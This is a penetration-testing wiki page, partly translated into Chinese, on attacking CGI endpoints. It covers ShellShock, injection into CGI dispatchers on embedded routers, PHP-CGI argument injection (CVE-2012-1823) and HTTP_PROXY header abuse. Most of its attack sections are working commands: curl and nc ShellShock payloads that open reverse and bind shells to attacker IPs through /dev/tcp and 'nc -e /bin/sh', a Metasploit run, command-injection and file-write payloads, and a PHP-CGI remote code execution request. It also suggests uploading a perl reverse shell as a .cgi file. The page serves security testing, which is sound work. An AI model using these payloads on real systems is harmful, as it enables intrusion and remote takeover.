# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## 信息

The **CGI 脚本是 perl 脚本**, so, if you have compromised a server that can execute _**.cgi**_ scripts you can **上传 perl reverse shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **将扩展名从** **.pl** **更改为** **.cgi**, 给予 **执行权限** \(`chmod +x`\) 并 **从 web 浏览器访问** 该 reverse shell 来执行它。  
In order to test for **CGI vulns** it's recommended to use `nikto -C all` \(and all the plugins\)

## **ShellShock**

**ShellShock** 是一个影响广泛使用的 **Bash** 命令行 shell（在类 Unix 操作系统中）的漏洞。它利用了 Bash 执行由应用程序传入命令的能力。该漏洞存在于对 **环境变量** 的操控中，环境变量是影响进程如何运行的动态命名值。攻击者可以通过将 **恶意代码** 附加到环境变量上来利用此漏洞，当变量被接收时这些代码会被执行，从而可能危及系统安全。

利用此漏洞时，**页面可能抛出错误**。

你可以通过注意其使用的是 **旧的 Apache 版本** 和 **cgi_mod** \(带有 cgi 文件夹\)，或使用 **nikto** 来**发现**此漏洞。

### **测试**

大多数测试基于使用 echo 输出某些内容，并期望该字符串出现在 web 响应中。如果你认为某个页面可能存在漏洞，搜索所有 cgi 页面并进行测试。

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(reflected, blind and out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### 漏洞利用
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## 集中式 CGI dispatchers（通过 selector parameters 在单一 endpoint 路由）

许多嵌入式 web UIs 在单一 CGI endpoint（例如 `/cgi-bin/cstecgi.cgi`）后面复用数十个有权限的操作，并使用像 `topicurl=<handler>` 这样的 selector parameter 将请求路由到内部函数。

Methodology to exploit these routers:

- 枚举 handler names：scrape JS/HTML、brute-force with wordlists，或 unpack firmware 并用 grep 搜索 dispatcher 使用的 handler strings。
- 测试 unauthenticated reachability：有些 handlers 忘记做 auth checks，可以被直接调用。
- 关注那些调用 system utilities 或 touch files 的 handlers；弱 validators 通常只阻止少数字符，可能会忽略前导连字符 `-`。

Generic exploit shapes:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
检测与加固：

- 注意对集中式 CGI 端点的未认证请求，其中 `topicurl` 被设置为敏感处理程序。
- 标记以 `-` 开头的参数（argv 选项注入尝试）。
- 厂商：对所有会改变状态的处理程序强制认证，使用严格的 allowlists/类型/长度 进行验证，并且绝不要将受用户控制的字符串作为命令行标志传递。

## 旧版 PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

基本上，如果 cgi 已启用且 php 版本“旧”（&lt;5.3.12 / &lt; 5.4.2），你可以执行代码。
要利用此漏洞，你需要在不发送参数（尤其是不发送字符 "="）的情况下访问 web 服务器上的某个 PHP 文件。
例如，为了测试该漏洞，你可以访问 `/index.php?-s`（注意 `-s`），并且 **应用程序的源代码将出现在响应中**。

然后，为了获得 **RCE**，你可以发送这个特殊查询：`/?-d allow_url_include=1 -d auto_prepend_file=php://input`，并将要执行的 **PHP 代码** 放在 **请求体中。示例：**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**更多关于该漏洞及可能利用的信息：** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **代理 \(MitM 针对 Web 服务器请求\)**

CGI 会为 http 请求中的每个 header 创建一个环境变量。例如："host:web.com" 会被创建为 "HTTP_HOST"="web.com"

由于 HTTP_PROXY 变量可能会被 web 服务器使用。尝试发送一个包含以下内容的 **header**： "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**"，如果服务器在会话期间执行任何请求，你就能捕获服务器发出的每个请求。

## **References**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
